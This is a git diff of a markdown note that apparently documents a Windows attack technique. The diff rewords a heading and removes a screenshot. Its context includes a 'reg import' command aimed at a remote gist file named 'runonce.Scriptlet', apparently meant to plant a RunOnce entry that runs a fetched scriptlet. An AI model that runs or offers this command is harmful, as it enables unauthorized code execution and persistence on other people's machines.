@@ -23,8 +23,8 @@ Sddl   : null
 PS C:\>
 ```
 
-## At this point don't get away that you can import this registry file
+## Currently, you have to go there and put instructions
 C:\> reg import 
 https://gist.githubusercontent.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae/raw/60b80e88c66fe58d2d906bb24f32925edd2fe025/runonce.Scriptlet
 
-![1231312312313123132131231321313](https://user-images.githubusercontent.com/25440152/47598884-48424780-d9a3-11e8-9816-a084b045ac71.PNG)
+ 
